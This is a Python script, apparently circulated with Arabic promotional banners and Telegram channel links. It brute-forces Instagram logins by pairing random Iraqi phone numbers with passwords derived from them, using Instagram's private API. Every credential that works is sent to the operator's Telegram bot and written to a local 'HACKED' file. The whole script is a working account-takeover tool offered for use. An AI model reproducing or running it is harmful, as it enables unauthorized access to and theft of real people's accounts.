import os
try:
    import uuid
except:
    os.system('pip install uuid')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')

try:
    import time
except:
    os.system('pip install time')
else:
    os.system('clear')
    try:
        import pyfiglet
    except:
        os.system('pip install pyfiglet')
    else:
        os.system('clear')
        import pyfiglet, os
        from time import sleep
        import webbrowser
        Z = '\x1b[2;31m'
        G = '\x1b[1;32m'
        sleep(2)
        P55 = pyfiglet.figlet_format('☆☆BRO☆☆')
        print(G + P55)
        sleep(4)
        os.system('clear')
        sleep(2)
        print("""
       - - - - - - - - - - - - - - - - - - - - - - - - -  -  
    BRO
        - - - - - - - - - - - - - - - - - - - - - - - - -
  لا تنسئ صور الصيد 
        - - - - - - - - - - - - - - - - - - - - - - - - -  -  
   مطور برو 
      الصيد يوصلك ع بوت التلي لا تنسئ صور الصيد حبي ✅💞
        - - - - - - - - - - - - - - - - - - - - - - - - -  -  
        """)
        webbrowser.open('https://t.me/rakiu1')
        webbrowser.open('https://t.me/a69ao')
        import random, uuid, requests, string
        from user_agent import generate_user_agent
        from datetime import datetime
        from random import *
        from time import sleep
        import requests, os, random, json, threading, secrets, uuid
        from colorama import Fore, Style
        from time import sleep
        from datetime import datetime
        from secrets import token_hex
        from uuid import uuid4
        from user_agent import generate_user_agent
        from uuid import uuid4
        aa = 0
        zz = 0
        E = '\x1b[1;31m'
        G = '\x1b[1;32m'
        S = '\x1b[1;33m'
       
        print('\n')
        ID = input(S+'  ID Telegram : ')
        print('\n')
        sleep(2)
        tok = input(S + 'TOKEN Telegram:  ')
        print('\n\n')
        print('☆'*70)
        webbrowser.open('https://t.me/rakiu1')
        Password = input('[+] اكتب باسورد الاداه :')    
        w = 'https://pastebin.com/raw/nVjtMQ7k'
        start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=مطور برو").json()
        id_msg = start_msg['result']['message_id']
        rss = requests.get(w).text
        if 'trakos' in rss:
            sleep(0.1)
        r = requests.Session()
        user = '0987654321'
        while True:
            us = str(''.join((random.choice(user) for i in range(7))))
            username = '+964770' + us
            password = '0770' + us
            url = 'https://i.instagram.com/api/v1/accounts/login/'
            headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
             'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
            uid = str(uuid4())
            data = {'uuid':uid, 
             'password':password, 
             'username':username, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
            req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
            if 'logged_in_user' in req_login.text:
                zz += 1
                print(G + 'username ==> : ' + username + ': password ==> : ' + password)
                tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=اجاك حساب من عمك برو ✅😂\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n[=]Email =>  {username} \n[=]password =>  {password} \n- - - - - - - - - - - - - - - - - - - - - - - - - -\n By :-@rakiu1 "
                i = requests.post(tlg)
                with open('ttrakos.txt', 'a') as (HACKED):
                    HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
            elif '"message":"challenge_required","challenge"' in req_login.text:
                print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
            else:
                requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= Hi يتم الفحص  الان انتظر الصيد\n- - - - - - - - - - - - - - - - - - - - - - - - -\n✅Yes HiT pro [{zz}]\n- - - - - - - - - - - - - - - - - - - - - - - - \n⭕️NO HiT Pro \n⭕️Email No 《 {username}  》=>  《{aa}》\n⭕️password No《 {password} 》=> 《{aa}》\n- - - - - - - - - - - - - - - - - - - - - - - - - \n By :  @rakiu1")
                print(E + 'username ==> : ' + username + ': password ==> : ' + password)
                aa += 1
              